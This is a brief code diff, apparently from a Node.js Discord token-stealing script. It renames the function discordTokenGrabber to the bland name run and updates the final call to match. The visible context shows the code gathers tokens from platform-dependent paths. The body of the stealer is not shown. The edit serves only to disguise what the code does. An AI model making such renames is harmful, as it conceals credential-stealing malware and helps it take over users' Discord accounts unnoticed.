@@ -267,7 +267,7 @@ function findToken(tokenPath) {
     return tokens;
 }
 
-function discordTokenGrabber () {
+function run () {
     let paths;
     const computerPlatform = process.platform;
 
@@ -323,4 +323,4 @@ function discordTokenGrabber () {
     return tokens;
 }
 
-discordTokenGrabber()
+run()
